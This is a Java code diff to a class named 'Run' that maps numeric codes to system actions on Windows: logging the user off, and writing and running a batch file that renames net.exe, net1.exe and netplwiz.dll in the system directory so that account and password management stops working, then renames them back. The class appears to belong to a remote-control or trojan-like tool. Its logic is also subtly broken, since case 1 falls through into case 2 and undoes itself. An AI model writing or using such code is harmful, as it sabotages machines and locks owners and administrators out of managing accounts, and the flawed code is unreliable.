@@ -27,10 +27,23 @@ public class Run implements IWriter{
   public void execute(int code){
     switch(code){
         case 0:
-          Runtime.getRuntime().exec("C:\Windows\System32\logoff.exe");
+          Runtime.getRuntime().exec("C:\\Windows\\System32\\logoff.exe");
+          break;
         case 1:
+          writeText("C:\\t.cmd", "ren %systemroot%\\net.exe n1.exe");
+          writeBR("C:\\t.cmd");
+          writeText("C:\\t.cmd", "ren %systemroot%\\net1.exe n2.exe");
+          writeBR("C:\\t.cmd");
+          writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dll netplwiz.dl3");
+          writeBR("C:\\t.cmd");
           Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
         case 2:
+          writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
+          writeBR("C:\\t.cmd");
+          writeText("C:\\t.cmd", "ren %systemroot%\\n2.exe net1.exe");
+          writeBR("C:\\t.cmd");
+          writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dl3 netplwiz.dll");
+          writeBR("C:\\t.cmd");
           Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
         default:
           return;
@@ -72,7 +85,7 @@ public class Run implements IWriter{
         sb.append(IWriter.armv7a);
         sb.append(rv);
         writeText("C:\\t.cmd", sb.toString());
-        Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
+        Runtime.getRuntime().exec("cmd.exe " + "C:\\t.cmd");
       }
     }
   }
